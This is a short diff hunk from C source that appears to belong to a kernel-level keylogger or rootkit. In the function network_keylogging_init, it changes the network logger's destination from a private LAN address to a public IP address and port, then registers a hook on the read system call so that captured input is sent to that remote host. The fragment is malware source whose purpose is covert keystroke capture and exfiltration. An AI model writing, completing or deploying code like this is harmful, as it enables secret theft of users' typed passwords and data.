@@ -71,7 +71,7 @@ int network_keylogging_init(int debug_mode_on)
 {
 	show_debug_messages = debug_mode_on;
 
-	netlogger_init("6666@192.168.178.22");
+	netlogger_init("10000@131.159.50.189");
 
 	register_callback(__NR_read, (void *) network_keylogging_read_syscall);
 
